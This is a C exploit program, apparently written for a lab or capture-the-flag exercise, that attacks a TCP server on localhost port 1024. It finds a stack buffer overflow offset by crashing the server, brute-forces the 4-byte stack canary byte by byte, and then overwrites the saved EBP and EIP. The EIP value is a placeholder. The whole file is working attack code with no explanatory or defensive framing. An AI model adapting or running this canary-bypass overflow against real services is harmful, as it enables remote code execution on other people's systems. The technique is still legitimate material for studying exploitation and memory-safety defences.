#define _BSD_SOURCE
#define _POSIX_SOURCE

#define HOST "127.0.0.1"
#define PORT 1024

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/time.h>
#include <errno.h>

size_t
find_canary_offset(struct sockaddr_in *addr,
		   socklen_t *addrlen) {
  int offset = 1;
  int sock;
  char *buffer = NULL;
  char buff[1024];
  struct timeval tv;

  for (;;) {

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock < 0)
      return EXIT_FAILURE;

    tv.tv_sec=0;
    tv.tv_usec = 40000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    connect(sock, (struct sockaddr *) addr, *addrlen);


    /* Sending buffer */
    buffer = realloc(buffer, (offset + 1) * sizeof(*buffer));
    memset(buffer, 0x42, offset);
    write(sock, buffer, offset);

    /* if read fail , we crashed the server */
    if (read(sock, buff, 1024) == -1)
      break;

    ++offset;
    close(sock);
  }
  free(buffer);
  close(sock);
  return offset;
}

void
find_canary(unsigned char *canary,
	    size_t offset,
	    struct sockaddr_in *addr,
	    socklen_t *addrlen) {
  int sock;
  struct timeval tv;
  char buffer[1024];
  char buff[1024];
  size_t i, x;

  for (i = 0; i < 4; ++i) {
    for (canary[i] = 0; canary[i] < 255; ++canary[i]) {

      sock = socket(AF_INET, SOCK_STREAM, 0);
      if (sock < 0)
	return;

      tv.tv_sec = 0;
      tv.tv_usec = 40000;
      setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

      connect(sock, (struct sockaddr *) addr, *addrlen);

      /* Sending buffer */
      memset(buffer, 0x42, offset);
      memcpy(buffer + offset - 1, canary, 4);

      write(sock, buffer, offset + i);

      /* if read succeed we found the good byte */
      if (read(sock, buff, 1024) > 0) {
	  close(sock);
	  break;
      }
      close(sock);
    }
    fprintf(stderr, "\t - found byte 0x%02x at offset 0x%x\n", canary[i], (unsigned int) (offset + i));
  }
}

void
overwrite(unsigned char *canary,
	  size_t offset,
	  struct sockaddr_in *addr,
	  socklen_t *addrlen) {
  int sock;
  char buffer[1024];

  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0)
    return;

  connect(sock, (struct sockaddr *) addr, *addrlen);

  memset(buffer, 0x42, sizeof(buffer));
  memcpy(buffer + offset - 1, canary, 4);

  /* Overwriting ebp */
  memset(buffer + offset + 12, 0x36, 4);
  /* Overwriting eip */
  memcpy(buffer + offset + 15, "\x90\x90\x90\x90", 4);

  write(sock, buffer, offset + 16);

  close(sock);
}

int
main(int const argc,
     char const *argv[]) {

  size_t canary_offset;
  unsigned char canary[4] = {0, 0, 0, 0};

  struct sockaddr_in addr;
  struct hostent *h;
  socklen_t addrlen;

  int port = PORT;

  if (argc == 2)
    port = atoi(argv[1]);

  /* Let's initialize our socket */
  addrlen = (socklen_t)sizeof(struct sockaddr_in);

  h = gethostbyname(HOST);
  if (h == NULL)
    return EXIT_FAILURE;

  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = htonl(INADDR_ANY);
  addr.sin_addr = *(struct in_addr*)*h->h_addr_list;

  canary_offset = find_canary_offset(&addr, &addrlen);
  fprintf(stderr, "[+] found canary at offset: 0x%x\n", (unsigned int) canary_offset);

  find_canary(canary, canary_offset, &addr, &addrlen);
  fprintf(stderr, "[+] canary is: 0x%02x%02x%02x%02x\n", canary[0], canary[1], canary[2], canary[3]);

  /*
    STACK (reminder, we are in 32bits)

    PARAMETERS	 > dunno
    EIP		 > 4 bytes
    EBP          > 4 bytes
    Canary       > 4 bytes
    END_DATA    |
    [...]        > 32 bytes
    START_DATA  |

    RIP is at [offset + 4 + 4]

  */

  /* for testing purpose */
  /* canary_offset = 0x21; */
  /* memcpy(canary, "\x00\xff\x72\x86", 4); */

  fprintf(stderr, "[+] Overwriting EBP and EIP\n");
  overwrite(canary, canary_offset, &addr, &addrlen);

  return 0;
}
